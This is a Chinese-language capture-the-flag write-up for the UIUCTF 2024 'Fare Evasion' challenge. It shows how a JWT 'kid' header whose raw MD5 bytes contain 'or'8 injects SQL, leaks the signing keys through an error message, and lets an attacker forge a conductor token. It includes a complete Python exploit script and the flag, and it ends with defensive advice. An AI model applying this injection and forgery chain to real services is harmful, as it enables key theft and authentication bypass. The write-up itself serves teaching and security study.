# UIUCTF 2024 Fare Evasion

## 题目简述

应用用 HS256 JWT 区分乘客与列车员。JWT 头中的 `kid` 会先经过 MD5，再拼进 SQLite 查询；查询到的密钥内容又会直接附在错误消息里。目标是利用这条查询泄露列车员签名密钥，再伪造能够通过第二次 JWT 校验的票据。

问题不在 JWT 算法混淆，而在“原始 MD5 字节进入 SQL 字符串”与“错误回显泄露查询结果”两处逻辑组合。

## 解题过程

访问首页时，服务器发放一个普通乘客 token：

```python
jwt.encode(
    {"type": "passenger"},
    PASSENGER_KEY,
    algorithm="HS256",
    headers={"kid": "passenger_key"},
)
```

`/pay` 不验证签名前就读取未受信任的 JWT 头，并构造查询：

```python
header = jwt.get_unverified_header(token)
kid = header["kid"]
query = f"SELECT * FROM keys WHERE kid = '{md5(kid)}'"
rows = db.cursor().execute(query).fetchall()
```

这里的 `md5()` 返回 `digest()` 的 16 个原始字节，再用 Latin-1 一一映射为字符串，而不是常见的 32 字符十六进制摘要：

```python
def md5(s: str):
    h = hashlib.new("md5")
    h.update(s.encode("utf-8"))
    return h.digest().decode("latin1")
```

因此可以寻找一个 `kid`，使其 MD5 原始字节本身包含引号和 SQL 运算符。已知可用值是：

```text
129581926211651571912466741651878684928
```

其 MD5 为：

```text
06 da 54 30 44 9f 8f 6f 23 df c1 27 6f 72 27 38
```

末尾五字节按 Latin-1 解码就是 `'or'8`。再加上查询模板提供的末尾引号，条件近似变为：

```sql
WHERE kid = '<前缀字节>' OR '8'
```

SQLite 把非零字符串常量视为真，查询因而返回 `keys` 表中的所有行。第一阶段 token 不需要有效签名，因为应用会在两次验签都失败后，把查询结果拼进响应：

```python
msg += f"\nhashed {row['kid']} secret: {row['content']}"
return {
    "success": False,
    "message": f"Key isn't passenger or conductor. {msg}",
}
```

构造注入 token，提取列车员密钥，再用它签发第二个 token：

```python
import jwt
import requests

URL = "https://fare-evasion.chal.uiuc.tf/pay"
MAGIC_KID = "129581926211651571912466741651878684928"

probe = jwt.encode(
    {},
    "invalid-key",
    algorithm="HS256",
    headers={"kid": MAGIC_KID},
)
response = requests.post(URL, cookies={"access_token": probe}).json()

conductor_key = None
for line in response["message"].splitlines():
    if "secret: conductor_key_" in line:
        conductor_key = line.split("secret: ", 1)[1]
        break
assert conductor_key is not None

forged = jwt.encode(
    {},
    conductor_key,
    algorithm="HS256",
    headers={"kid": "anything"},
)
result = requests.post(URL, cookies={"access_token": forged}).json()
print(result["message"])
```

第二阶段的 `kid` 只要存在即可；程序最终是否放行只取决于 token 能否用硬编码的 `CONDUCTOR_KEY` 验证。成功响应包含：

```text
Conductor override success. uiuctf{sigpwny_does_not_condone_turnstile_hopping!}
```

## 方法总结

本题利用链是“JWT 未验证头可控 → 原始 MD5 字节形成 SQL 注入 → 错误消息回显密钥 → HS256 伪造”。若 MD5 被编码为十六进制，输出只会包含 `[0-9a-f]`，这条注入链就不会成立；危险点正是把任意二进制摘要直接当成 SQL 文本。

防御上应使用参数化查询，不能让 `kid` 参与字符串拼接；也不应在验签前信任 JWT 头指向的密钥，更不能把数据库中的签名密钥回显给客户端。
